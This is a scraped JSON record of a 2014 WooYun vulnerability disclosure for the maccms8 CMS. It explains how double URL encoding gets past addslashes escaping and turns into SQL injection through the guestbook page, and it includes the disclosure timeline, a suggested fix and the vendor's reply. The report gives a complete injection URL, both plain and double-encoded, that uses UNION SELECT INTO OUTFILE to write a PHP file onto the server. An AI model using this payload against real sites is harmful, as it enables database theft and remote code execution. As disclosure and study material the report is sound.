{"id": 53739, "wybug_id": "wooyun-2014-066661", "wybug_title": "maccms8  设计逻辑缺陷导致sql注入", "wybug_corp": "maccms.com", "wybug_author": "路人甲", "wybug_date": "2014-06-30 10:33", "wybug_open_date": "2014-09-28 10:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向公众公开  简要描述： maccms8  设计逻辑缺陷，导致sql注入 详细说明：  废话不多说，首先我们进入入口文件index.php:\n$m = be('get','m');    if(strpos($m,'.')){ $m = substr($m,0,strpos($m,'.')); }    $par = explode('-',$m);    $parlen = count($par);    $ac = $par[0];        if(empty($ac)){ $ac='vod'; $method='index'; }        $colnum = array(\"id\",\"pg\",\"yaer\",\"typeid\",\"classid\");    if($parlen>=2){    \t$method = $par[1];    \t for($i=2;$i<$parlen;$i+=2){            $tpl->P[$par[$i]] = in_array($par[$i],$colnum) ? intval($par[$i+1]) : urldecode($par[$i+1]);        }    }    if($tpl->P['pg']<1){ $tpl->P['pg']=1; }\n追踪be函数，代码如下：\nfunction be($mode,$key,$sp=','){\tini_set(\"magic_quotes_runtime\", 0);\t$magicq= get_magic_quotes_gpc();\tswitch($mode)\t{\t\tcase 'post':\t\t\t$res=isset($_POST[$key]) ? $magicq?$_POST[$key]:@addslashes($_POST[$key]) : '';\t\t\tbreak;\t\tcase 'get':\t\t\t$res=isset($_GET[$key]) ? $magicq?$_GET[$key]:@addslashes($_GET[$key]) : '';\t\t\tbreak;\t\tcase 'arr':\t\t\t$arr =isset($_POST[$key]) ? $_POST[$key] : '';\t\t\tif($arr==\"\"){\t\t\t\t$value=\"0\";\t\t\t}\t\t\telse{\t\t\t\tfor($i=0;$i<count($arr);$i++){\t\t\t\t\t$res=implode($sp,$arr);\t\t\t\t} \t\t\t}\t\t\tbreak;\t\tdefault:\t\t\t$res=isset($_REQUEST[$key]) ? $magicq ? $_REQUEST[$key] : @addslashes($_REQUEST[$key]) : '';\t\t\tbreak;\t}\treturn $res;}\n发现这里对特殊字符进行了addslashes，那么我们%2527传递到这里就是一个%27，那么就不会被过滤，然后我们逃出来看看，神奇的地方，必有神奇的写法\nfor($i=2;$i<$parlen;$i+=2){            $tpl->P[$par[$i]] = in_array($par[$i],$colnum) ? intval($par[$i+1]) : urldecode($par[$i+1]);        }\n看见了没有这里又进行了urldecode,所以大家都明白了怎么绕过这个cms了，下来我们找一个文件，gbook.php：\n$tpl->P['cn'] = 'gbook'.$tpl->P['pg'];\t//echoPageCache($tpl->P['cp'],$tpl->P['cn']);\t$tpl->H = loadFile(MAC_ROOT.\"/template/\".$MAC['site']['templatedir'].\"/\".$MAC['site']['htmldir'].\"/home_gbook.html\");\t$db = new AppDb($MAC['db']['server'],$MAC['db']['user'],$MAC['db']['pass'],$MAC['db']['name']);\t$tpl->mark();\t$tpl->H = str_replace(\"{maccms:gbookverify}\", $MAC['other']['gbookverify'] ,$tpl->H);\tif(strpos($tpl->H,'{maccms:count_gbook_all}')){\t\t$tpl->H = str_replace(\"{maccms:\n这里有一个mark函数，然后我们跟踪进去发现里面有一个sql操作的函数\n$this->markname = $matches1[1][$i];            $this->markpar = $matches1[2][$i];            $this->markdes = $matches1[3][$i];            $this->mark_sql();                        switch($this->markname)            {\n再次跟进去mark_sql()函数，我们就明白了 这里进行了select查询，那么接下来我们构造sql语句，由于cms是一个伪静态页面的访问，全部由index.php分发:urlhttp://192.168.10.70/maccms8_mfb_/maccms8_mfb/index.php?m=gbook-show-wd-ss11s') union select 1,2,3,user(),version(),\"<?php phpinfo()?>\",NULL,NULL,NULL into outfile 'E:/wamp/www/maccms8_mfb_/maccms8_mfb/cache/userinfo'#ORDER BY g_time desc limit 0,10根据上面的分析，我们对m后面的参数进行两次url编码：http://192.168.10.70/maccms8_mfb_/maccms8_mfb/index.php?m=gbook-show-wd-ss11s%2527%2529%2520union%2520select%25201%252C2%252C3%252Cuser%2528%2529%252Cversion%2528%2529%252C%2522%253C%253Fphp%2520phpinfo%2528%2529%253F%253E%2522%252CNULL%252CNULL%252CNULL%2520into%2520outfile%2520%2527E%253A%252fwamp%252fwww%252fmaccms8_mfb_%252fmaccms8_mfb%252fcache%252fuserinfo%2527%2523ORDER%2520BY%2520g_time%2520desc%2520limit%25200%252C10请求后我们，发现如图：\n\n我们然后去访问我们生成的文件：\n\n   漏洞证明：     修复方案：  在对参数采用addshlash的时候首先进行urldecode而且这里要循环解码，然后最终的再进行过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-30 21:06 厂商回复： 感谢您对本cms的长期白帽测试，我们在0627版本中测试，该注入参数可以被脚本拦截。 down点maccms点com 下载最新测试版 。我们也会继续关注此类似的多个漏洞。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}